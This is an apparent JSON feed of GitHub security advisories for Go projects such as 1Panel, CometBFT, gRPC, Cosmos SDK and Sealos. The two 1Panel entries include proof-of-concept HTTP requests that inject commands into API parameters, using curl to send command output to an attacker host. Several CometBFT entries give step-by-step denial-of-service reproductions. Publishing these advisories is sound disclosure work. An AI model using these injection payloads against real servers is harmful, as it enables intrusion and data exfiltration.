{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The authenticated attacker can craft a malicious payloads to achieve command injection when entering the container terminal.</p>\n<ol>\n<li>Vulnerability analysis.</li>\n</ol>\n<pre><code>backend\\app\\api\\v1\\terminal.go#ContainerWsSsh\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/46734380/249119420-045ec192-250d-4d07-a69e-0bd794cddec7.png\"></p>\n<ol start=\"2\">\n<li>vulnerability reproduction.</li>\n</ol>\n<pre><code>GET /api/v1/containers/exec?cols=80&amp;rows=24&amp;containerid=/bin/bash||curl%20http://192.168.109.1:12345/`whoami`||&amp;user=asd&amp;command=/bin/bash HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nSec-WebSocket-Version: 13\nOrigin: http://192.168.109.152:40982\nSec-WebSocket-Key: cOEWTRgkjxVppuhzAfOUWQ==\nConnection: keep-alive, Upgrade\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\nPragma: no-cache\nCache-Control: no-cache\nUpgrade: websocket\n</code></pre>\n<ol start=\"3\">\n<li>The successful execution of system commands.\n<img alt=\"image\" src=\"https://user-images.githubusercontent.com/46734380/249119520-ed2dcc32-be4a-45d8-9286-f9fb778e87da.png\"></li>\n</ol>\n<p>Affected versions: &lt;= 1.3.5</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been fixed in v1.3.6.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>It is recommended to upgrade the version to v1.3.6.</p>\n<h3 id=\"references\">References</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/1Panel-dev/1Panel\">https://github.com/1Panel-dev/1Panel</a>\nEmail us at <a href=\"mailto:wanghe@fit2cloud.com\">wanghe@fit2cloud.com</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-7x2c-fgx6-xf9h\">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-7x2c-fgx6-xf9h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36458\">https://nvd.nist.gov/vuln/detail/CVE-2023-36458</a></li>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6\">https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7x2c-fgx6-xf9h\">https://github.com/advisories/GHSA-7x2c-fgx6-xf9h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7x2c-fgx6-xf9h",
            "title": "[github.com/1Panel-dev/1Panel] 1Panel vulnerable to ommand injection when entering the container terminal",
            "date_modified": "2023-07-05T21:38:55.000Z",
            "date_published": "2023-07-05T21:38:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7x2c-fgx6-xf9h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The authenticated attacker can craft a malicious payload to achieve command injection when adding container repositories.</p>\n<ol>\n<li>Vulnerability analysis.</li>\n</ol>\n<pre><code>backend\\app\\api\\v1\\image_repo.go#create\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/46734380/249118560-8c20dac6-d1be-49d2-b2b2-9a4df9b7cd04.png\"></p>\n<pre><code>backend\\app\\service\\image_repo.go#CheckConn\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/46734380/249118639-37b7a1e9-08a9-4316-8beb-39beefdceb33.png\"></p>\n<ol start=\"2\">\n<li>vulnerability reproduction.</li>\n</ol>\n<pre><code>POST /api/v1/containers/repo HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-CSRF-TOKEN: \nContent-Length: 446\nOrigin: http://192.168.109.152:40982\nConnection: close\nReferer: http://192.168.109.152:40982/containers/repo\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\n</code></pre>\n<pre><code>{\"id\":2,\"createdAt\":\"2023-04-13T19:57:43.633643247-07:00\",\"name\":\"asdasd\",\"downloadUrl\":\"127.0.0.1:8080\",\"protocol\":\"http\",\"username\":\"admin||curl http://192.168.109.1:12345/`ls`||\",\"auth\":true,\"status\":\"Failed\",\"message\":\"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\\nError response from daemon: Get \\\"http://127.0.0.1:8080/v2/\\\": dial tcp 127.0.0.1:8080: connect: connection refused\\n\",\"password\":\"Passw0rd\"}\n</code></pre>\n<ol start=\"3\">\n<li>Using update can be triggered multiple times.</li>\n</ol>\n<pre><code>POST /api/v1/containers/repo/update HTTP/1.1\nHost: 192.168.109.152:40982\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nX-CSRF-TOKEN: \nContent-Length: 447\nOrigin: http://192.168.109.152:40982\nConnection: close\nReferer: http://192.168.109.152:40982/containers/repo\nCookie: rem-username=admin; psession=a6bcab14-d426-4cfe-8635-533e88b6f75e\n</code></pre>\n<pre><code>{\"id\":2,\"createdAt\":\"2023-04-13T19:57:43.633643247-07:00\",\"name\":\"asdasd\",\"downloadUrl\":\"127.0.0.1:8080\",\"protocol\":\"http\",\"username\":\"admin||curl http://192.168.109.1:12345/`pwd`||\",\"auth\":true,\"status\":\"Failed\",\"message\":\"stderr: WARNING! Using --password via the CLI is insecure. Use --password-stdin.\\nError response from daemon: Get \\\"http://127.0.0.1:8080/v2/\\\": dial tcp 127.0.0.1:8080: connect: connection refused\\n\",\"password\":\"Passw0rd\"}\n</code></pre>\n<p>Affected versions: &lt;= 1.3.5</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been fixed in v1.3.6.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>It is recommended to upgrade the version to v1.3.6.</p>\n<h3 id=\"references\">References</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Open an issue in <a href=\"https://github.com/1Panel-dev/1Panel\">https://github.com/1Panel-dev/1Panel</a>\nEmail us at <a href=\"mailto:wanghe@fit2cloud.com\">wanghe@fit2cloud.com</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-q2mx-gpjf-3h8x\">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-q2mx-gpjf-3h8x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36457\">https://nvd.nist.gov/vuln/detail/CVE-2023-36457</a></li>\n<li><a href=\"https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6\">https://github.com/1Panel-dev/1Panel/releases/tag/v1.3.6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q2mx-gpjf-3h8x\">https://github.com/advisories/GHSA-q2mx-gpjf-3h8x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q2mx-gpjf-3h8x",
            "title": "[github.com/1Panel-dev/1Panel] 1Panel vulnerable to command injection when adding container repositories",
            "date_modified": "2023-07-05T21:38:07.000Z",
            "date_published": "2023-07-05T21:38:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q2mx-gpjf-3h8x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The mempool maintains two data structures to keep track of outstanding transactions: a list and a map.\nThese two data structures are supposed to be in sync all the time in the sense that the map tracks the index (if any) of the transaction in the list. </p>\n<p>Unfortunately, it is possible to have them out of sync. When this happens, the list may contain several copies of the same transaction.\nBecause the map tracks a single index, it is then no longer possible to remove all the copies of the transaction from the list.\nThis happens  even if the duplicated transaction is later committed in a block.\nThe only way to remove the transaction is by restarting the node.</p>\n<p>These are the steps to cause the above duplication problem. Everything should happen within one height, that is no <code>FinalizeBlock</code> or <code>BeginBlock</code> ABCI calls should happen while these steps are reproduced:</p>\n<ol>\n<li>send transaction tx1 to the target full node via RPC</li>\n<li>send N more different transactions to the target full node, where N should be higher than the node's configured value for <code>cache_size</code> in <code>config.toml</code></li>\n<li>send transaction tx1 again to the target full node</li>\n</ol>\n<p>One of the copies of tx1 is now <em>stuck</em> in the mempool's data structures. Effectively causing a memory leak, and having that node gossiping that transaction to its peers forever.</p>\n<p>The above problem can be repeated on and on until a sizable number of transactions are stuck in the mempool, in order to try to bring down the target node.</p>\n<p>This problem is present in releases: <code>v0.37.0</code>, and <code>v0.37.1</code>, as well as in <code>v0.34.28</code>, and all previous releases of the CometBFT repo. It will be fixed in releases <code>v0.34.29</code> and <code>v0.37.2</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The PR containing the fix is <a href=\"https://github.com/cometbft/cometbft/pull/890\">here</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Increasing the value of <code>cache_size</code> in <code>config.toml</code> makes it very difficult to effectively attack a full node.</li>\n<li>Not exposing the transaction submission RPC's would mitigate the probability of a successful attack, as the attacker would then have to create a modified (byzantine) full node to be able to perform the attack via p2p.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tendermint/tendermint/pull/2778\">PR</a> that introduced the map to track transactions in the mempool.</li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/890\">PR</a> containing the fix.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm\">https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34451\">https://nvd.nist.gov/vuln/detail/CVE-2023-34451</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/890\">https://github.com/cometbft/cometbft/pull/890</a></li>\n<li><a href=\"https://github.com/tendermint/tendermint/pull/2778\">https://github.com/tendermint/tendermint/pull/2778</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w24w-wp77-qffm\">https://github.com/advisories/GHSA-w24w-wp77-qffm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w24w-wp77-qffm",
            "title": "[github.com/cometbft/cometbft] CometBFT may duplicate transactions in the mempool's data structures",
            "date_modified": "2023-07-05T21:34:54.000Z",
            "date_published": "2023-07-05T21:34:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w24w-wp77-qffm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The mempool maintains two data structures to keep track of outstanding transactions: a list and a map.\nThese two data structures are supposed to be in sync all the time in the sense that the map tracks the index (if any) of the transaction in the list. </p>\n<p>Unfortunately, it is possible to have them out of sync. When this happens, the list may contain several copies of the same transaction.\nBecause the map tracks a single index, it is then no longer possible to remove all the copies of the transaction from the list.\nThis happens  even if the duplicated transaction is later committed in a block.\nThe only way to remove the transaction is by restarting the node.</p>\n<p>These are the steps to cause the above duplication problem. Everything should happen within one height, that is no <code>FinalizeBlock</code> or <code>BeginBlock</code> ABCI calls should happen while these steps are reproduced:</p>\n<ol>\n<li>send transaction tx1 to the target full node via RPC</li>\n<li>send N more different transactions to the target full node, where N should be higher than the node's configured value for <code>cache_size</code> in <code>config.toml</code></li>\n<li>send transaction tx1 again to the target full node</li>\n</ol>\n<p>One of the copies of tx1 is now <em>stuck</em> in the mempool's data structures. Effectively causing a memory leak, and having that node gossiping that transaction to its peers forever.</p>\n<p>The above problem can be repeated on and on until a sizable number of transactions are stuck in the mempool, in order to try to bring down the target node.</p>\n<p>This problem is present in releases: <code>v0.37.0</code>, and <code>v0.37.1</code>, as well as in <code>v0.34.28</code>, and all previous releases of the CometBFT repo. It will be fixed in releases <code>v0.34.29</code> and <code>v0.37.2</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The PR containing the fix is <a href=\"https://github.com/cometbft/cometbft/pull/890\">here</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Increasing the value of <code>cache_size</code> in <code>config.toml</code> makes it very difficult to effectively attack a full node.</li>\n<li>Not exposing the transaction submission RPC's would mitigate the probability of a successful attack, as the attacker would then have to create a modified (byzantine) full node to be able to perform the attack via p2p.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tendermint/tendermint/pull/2778\">PR</a> that introduced the map to track transactions in the mempool.</li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/890\">PR</a> containing the fix.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm\">https://github.com/cometbft/cometbft/security/advisories/GHSA-w24w-wp77-qffm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34451\">https://nvd.nist.gov/vuln/detail/CVE-2023-34451</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/890\">https://github.com/cometbft/cometbft/pull/890</a></li>\n<li><a href=\"https://github.com/tendermint/tendermint/pull/2778\">https://github.com/tendermint/tendermint/pull/2778</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w24w-wp77-qffm\">https://github.com/advisories/GHSA-w24w-wp77-qffm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w24w-wp77-qffm",
            "title": "[github.com/cometbft/cometbft] CometBFT may duplicate transactions in the mempool's data structures",
            "date_modified": "2023-07-05T21:34:54.000Z",
            "date_published": "2023-07-05T21:34:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w24w-wp77-qffm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An internal modification to the way struct <code>PeerState</code> is serialized to JSON introduced a deadlock when new function MarshallJSON is called. This function can be called from two places:</p>\n<ol>\n<li>Via logs<ul>\n<li>Setting the <code>consensus</code> logging module to \"debug\" level (should not happen in production), and</li>\n<li>Setting the log output format to JSON</li>\n</ul>\n</li>\n<li>Via RPC <code>dump_consensus_state</code></li>\n</ol>\n<p>Case 1 above, which should not be hit in production, will eventually hit the deadlock in most goroutines, effectively halting the node.</p>\n<p>In case 2, only the data structures related to the first peer will be deadlocked, together with the thread(s) dealing with the RPC request(s). This means that only one of the channels of communication to the node's peers will be blocked. Eventually the peer will timeout and excluded from the list (typically after 2 minutes). The goroutines involved in the deadlock will not be garbage collected, but they will not interfere with the system after the peer is excluded.</p>\n<p>The theoretical worst case for case 2, is a network with only two validator nodes. In this case, each of the nodes only has one <code>PeerState</code> struct. If <code>dump_consensus_state</code> is called in either node (or both), the chain will halt until the peer connections time out, after which the nodes will reconnect (with different <code>PeerState</code> structs) and the chain will progress again. Then, the same process can be repeated.</p>\n<p>As the number of nodes in a network increases, and thus, the number of peer struct each node maintains, the possibility of reproducing the perturbation visible with 2 nodes decreases. Only the first <code>PeerState</code> struct will deadlock, and not the others (RPC <code>dump_consensus_state</code> accesses them in a for loop, so the deadlock at the first iteration causes the rest of the iterations of that \"for\" loop to never be reached).</p>\n<p>This regression was introduced in versions <code>v0.34.28</code> and <code>v0.37.1</code>, and will be fixed in <code>v0.34.29</code> and <code>v0.37.2</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The PR containing the fix is <a href=\"https://github.com/cometbft/cometbft/pull/865\">here</a>, and the corresponding issue is <a href=\"https://github.com/cometbft/cometbft/pull/863\">here</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For case 1 (hitting the deadlock via logs)</p>\n<ul>\n<li>either don't set the log output to \"json\", leave at \"plain\",</li>\n<li>or don't set the consensus logging module to \"debug\", leave it at \"info\" or higher.</li>\n</ul>\n<p>For case 2 (hitting the deadlock via RPC <code>dump_consensus_state</code>)</p>\n<ul>\n<li>do not expose <code>dump_consensus_state</code> RPC endpoint to the public internet (e.g., via rules in your nginx setup)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/863\">Issue</a> that introduced the deadlock</li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/524\">Issue</a> reporting the bug via logs</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr\">https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34450\">https://nvd.nist.gov/vuln/detail/CVE-2023-34450</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/524\">https://github.com/cometbft/cometbft/pull/524</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/863\">https://github.com/cometbft/cometbft/pull/863</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/865\">https://github.com/cometbft/cometbft/pull/865</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mvj3-qrqh-cjvr\">https://github.com/advisories/GHSA-mvj3-qrqh-cjvr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mvj3-qrqh-cjvr",
            "title": "[github.com/cometbft/cometbft] CometBFT PeerState JSON serialization deadlock",
            "date_modified": "2023-07-05T21:33:49.000Z",
            "date_published": "2023-07-05T21:33:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mvj3-qrqh-cjvr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An internal modification to the way struct <code>PeerState</code> is serialized to JSON introduced a deadlock when new function MarshallJSON is called. This function can be called from two places:</p>\n<ol>\n<li>Via logs<ul>\n<li>Setting the <code>consensus</code> logging module to \"debug\" level (should not happen in production), and</li>\n<li>Setting the log output format to JSON</li>\n</ul>\n</li>\n<li>Via RPC <code>dump_consensus_state</code></li>\n</ol>\n<p>Case 1 above, which should not be hit in production, will eventually hit the deadlock in most goroutines, effectively halting the node.</p>\n<p>In case 2, only the data structures related to the first peer will be deadlocked, together with the thread(s) dealing with the RPC request(s). This means that only one of the channels of communication to the node's peers will be blocked. Eventually the peer will timeout and excluded from the list (typically after 2 minutes). The goroutines involved in the deadlock will not be garbage collected, but they will not interfere with the system after the peer is excluded.</p>\n<p>The theoretical worst case for case 2, is a network with only two validator nodes. In this case, each of the nodes only has one <code>PeerState</code> struct. If <code>dump_consensus_state</code> is called in either node (or both), the chain will halt until the peer connections time out, after which the nodes will reconnect (with different <code>PeerState</code> structs) and the chain will progress again. Then, the same process can be repeated.</p>\n<p>As the number of nodes in a network increases, and thus, the number of peer struct each node maintains, the possibility of reproducing the perturbation visible with 2 nodes decreases. Only the first <code>PeerState</code> struct will deadlock, and not the others (RPC <code>dump_consensus_state</code> accesses them in a for loop, so the deadlock at the first iteration causes the rest of the iterations of that \"for\" loop to never be reached).</p>\n<p>This regression was introduced in versions <code>v0.34.28</code> and <code>v0.37.1</code>, and will be fixed in <code>v0.34.29</code> and <code>v0.37.2</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The PR containing the fix is <a href=\"https://github.com/cometbft/cometbft/pull/865\">here</a>, and the corresponding issue is <a href=\"https://github.com/cometbft/cometbft/pull/863\">here</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For case 1 (hitting the deadlock via logs)</p>\n<ul>\n<li>either don't set the log output to \"json\", leave at \"plain\",</li>\n<li>or don't set the consensus logging module to \"debug\", leave it at \"info\" or higher.</li>\n</ul>\n<p>For case 2 (hitting the deadlock via RPC <code>dump_consensus_state</code>)</p>\n<ul>\n<li>do not expose <code>dump_consensus_state</code> RPC endpoint to the public internet (e.g., via rules in your nginx setup)</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/863\">Issue</a> that introduced the deadlock</li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/524\">Issue</a> reporting the bug via logs</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr\">https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-34450\">https://nvd.nist.gov/vuln/detail/CVE-2023-34450</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/524\">https://github.com/cometbft/cometbft/pull/524</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/863\">https://github.com/cometbft/cometbft/pull/863</a></li>\n<li><a href=\"https://github.com/cometbft/cometbft/pull/865\">https://github.com/cometbft/cometbft/pull/865</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mvj3-qrqh-cjvr\">https://github.com/advisories/GHSA-mvj3-qrqh-cjvr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mvj3-qrqh-cjvr",
            "title": "[github.com/cometbft/cometbft] CometBFT PeerState JSON serialization deadlock",
            "date_modified": "2023-07-05T21:33:49.000Z",
            "date_published": "2023-07-05T21:33:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mvj3-qrqh-cjvr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>When gRPC HTTP2 stack raised a header size exceeded error, it skipped parsing the rest of the HPACK frame. This caused any HPACK table mutations to also be skipped, resulting in a desynchronization of HPACK tables between sender and receiver. If leveraged, say, between a proxy and a backend, this could lead to requests from the proxy being interpreted as containing headers from different proxy clients - leading to an information leak that can be used for privilege escalation or data exfiltration. We recommend upgrading beyond the commit contained in&nbsp; <a href=\"https://github.com/grpc/grpc/pull/32309\">https://github.com/grpc/grpc/pull/32309</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-32731\">https://nvd.nist.gov/vuln/detail/CVE-2023-32731</a></li>\n<li><a href=\"https://github.com/grpc/grpc/pull/32309\">https://github.com/grpc/grpc/pull/32309</a></li>\n<li><a href=\"https://github.com/grpc/grpc/pull/33005\">https://github.com/grpc/grpc/pull/33005</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cfgp-2977-2fmm\">https://github.com/advisories/GHSA-cfgp-2977-2fmm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cfgp-2977-2fmm",
            "title": "[google.golang.org/grpc] Connection confusion in gRPC",
            "date_modified": "2023-07-05T20:26:49.000Z",
            "date_published": "2023-07-05T19:12:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cfgp-2977-2fmm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"xcrisis-does-not-charge-constantfee\">x/crisis does not charge ConstantFee</h1>\n<h3 id=\"impact\">Impact</h3>\n<p>If a transaction is sent to the <code>x/crisis</code> module to check an invariant, the ConstantFee parameter of the chain is NOT charged. All versions of the <code>x/crisis</code> module are affected on all versions of the Cosmos SDK.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>x/crisis</code> module is supposed to allow anyone to halt a chain in the event of a violated invariant by sending a <code>MsgVerifyInvariant</code> with the name of the invariant. Processing this message takes extra processing power hence a <code>ConstantFee</code> was introduced on the chain that is charged as extra from the reporter for the extra computational work. This is supposed to avert spammers on the chain making nodes do extra computations using this transaction. By not charging the <code>ConstantFee</code>, the transactions related to invariant checking are relatively cheaper compared to the computational need and other transactions.</p>\n<p>That said, the submitter still has to pay the transaction fee to put the transaction on the network, hence using this weakness for spamming is limited by the usual mechanisms.</p>\n<p>Synthetic testing showed up to a 20% increase in CPU usage on a validator node that is spammed by hundreds of <code>MsgVerifyInvariant</code> messages which still makes this an expensive operation to carry out on a live blockchain network.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The <code>ConstantFee</code> charge of the <code>x/crisis</code> module will either be fixed or disabled in an upcoming regular release of the Cosmos SDK.</p>\n<p>The <code>x/crisis</code> module was originally intended to allow chains to halt rather than continue with some unknown behavior in the case of an invariant violation (safety over liveness). However, as chains mature, and especially as the potential <a href=\"https://github.com/osmosis-labs/osmosis/issues/570\">cost of halting increases</a>, chains should consider carefully what invariants they really want to halt for, and what invariants are just sort of helpful sanity checks.</p>\n<p>The SDK team is working on new modules that allow chain developers to fine-tune the chain invariants and the necessary actions.</p>\n<p>Hence, the decision was made that the <code>x/crisis</code> module will be deprecated when new modules take over its responsibilities.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no workaround posted. Validators are advised to leave some extra computing room on their servers for possible spamming scenarios. (This is a good measure in any case.)</p>\n<h3 id=\"references\">References</h3>\n<p>SDK developer epic about invariant checking: <a href=\"https://github.com/cosmos/cosmos-sdk/issues/15706\">https://github.com/cosmos/cosmos-sdk/issues/15706</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-w5w5-2882-47pc\">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-w5w5-2882-47pc</a></li>\n<li><a href=\"https://github.com/cosmos/cosmos-sdk/issues/15706\">https://github.com/cosmos/cosmos-sdk/issues/15706</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w5w5-2882-47pc\">https://github.com/advisories/GHSA-w5w5-2882-47pc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w5w5-2882-47pc",
            "title": "[github.com/cosmos/cosmos-sdk] github.com/cosmos/cosmos-sdk's x/crisis does not charge ConstantFee",
            "date_modified": "2023-06-30T22:23:26.000Z",
            "date_published": "2023-06-30T22:13:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w5w5-2882-47pc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a permission flaw in the Sealos billing system, which allows users to control the recharge resource account. sealos. io/v1/Payment, resulting in the ability to recharge any amount of 1 RMB.</p>\n<h3 id=\"details\">Details</h3>\n<p>The reason is that sealos is in arrears. Egg pain, we can't create a terminal anymore. Let's charge for it:</p>\n<p>Then it was discovered that the charging interface had returned all resource information. Unfortunately, based on previous vulnerability experience, the namespace of this custom resource is still under the current user's control and may have permission to correct it.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>disable by publish</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>sealos public cloud user</li>\n<li>CWE-287 Improper Authentication</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/labring/sealos/security/advisories/GHSA-vpxf-q44g-w34w\">https://github.com/labring/sealos/security/advisories/GHSA-vpxf-q44g-w34w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36815\">https://nvd.nist.gov/vuln/detail/CVE-2023-36815</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vpxf-q44g-w34w\">https://github.com/advisories/GHSA-vpxf-q44g-w34w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vpxf-q44g-w34w",
            "title": "[github.com/labring/sealos] Sealos billing system permission control defect",
            "date_modified": "2023-07-03T18:38:26.000Z",
            "date_published": "2023-06-30T20:36:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vpxf-q44g-w34w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Improper configuration of RBAC permissions resulted in obtaining cluster control permissions, which could control the entire cluster deployed with Sealos, as well as hundreds of pods and other resources within the cluster.</p>\n<h3 id=\"details\">Details</h3>\n<p>detail's is disable by publish.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>detail's is disable by publish.</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>sealos public cloud user</li>\n<li>CWE-287 Improper Authentication</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/labring/sealos/security/advisories/GHSA-74j8-w7f9-pp62\">https://github.com/labring/sealos/security/advisories/GHSA-74j8-w7f9-pp62</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-33190\">https://nvd.nist.gov/vuln/detail/CVE-2023-33190</a></li>\n<li><a href=\"https://github.com/labring/sealos/commit/4cdf52e55666864e5f90ed502e9fc13e18985b7b\">https://github.com/labring/sealos/commit/4cdf52e55666864e5f90ed502e9fc13e18985b7b</a></li>\n<li><a 